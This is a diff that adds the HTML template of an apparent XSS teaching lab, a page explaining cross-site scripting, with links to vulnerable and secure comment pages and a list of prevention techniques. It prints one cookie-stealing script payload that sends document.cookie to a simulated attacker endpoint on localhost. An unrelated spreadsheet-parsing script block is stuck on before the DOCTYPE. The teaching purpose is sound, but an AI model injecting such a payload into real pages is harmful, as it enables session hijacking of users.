@@ -1,0 +1,88 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html>
+<head>
+    <title>Learn about XSS</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        pre { background: #f0f0f0; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Understanding Cross-Site Scripting (XSS)</h1>
+    <p><a href="{{ url_for('comment_vulnerable') }}">Back to Vulnerable Page</a> | <a href="{{ url_for('comment_secure') }}">Back to Secure Page</a></p>
+    
+    <h2>What is XSS?</h2>
+    <p>Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to stealing cookies, redirecting users, or performing actions on behalf of the user.</p>
+    
+    <h2>How Attackers Use XSS to Steal Cookies</h2>
+    <p>Attackers can inject a script like this in the vulnerable comment page:</p>
+    <pre>&lt;script&gt;document.location='http://localhost:5000/attacker?cookie='+document.cookie;&lt;/script&gt;</pre>
+    <p>This script:
+    <ul>
+        <li>Accesses the victim's cookies using <code>document.cookie</code></li>
+        <li>Sends them to the attacker's server (simulated at /attacker)</li>
+        <li>The attacker can then use these cookies to impersonate the user</li>
+    </ul>
+    
+    <h2>Why is the Vulnerable Page Unsafe?</h2>
+    <p>The vulnerable page:
+    <ul>
+        <li>Doesn't sanitize user input, allowing scripts to execute</li>
+        <li>Uses cookies without HttpOnly and Secure flags</li>
+    </ul>
+    
+    <h2>How the Secure Page Prevents XSS</h2>
+    <p>The secure page:
+    <ul>
+        <li>Uses Flask's <code>escape()</code> function to sanitize user input</li>
+        <li>Converts special characters like <code>&lt;</code> to <code>&amp;lt;</code>, preventing script execution</li>
+    </ul>
+    
+    <h2>Prevention Techniques</h2>
+    <ul>
+        <li>Always sanitize user input using libraries like <code>escape()</code></li>
+        <li>Set HttpOnly and Secure flags on cookies</li>
+        <li>Use Content Security Policy (CSP) headers</li>
+        <li>Validate and sanitize all user inputs</li>
+    </ul>
+</body>
+</html>
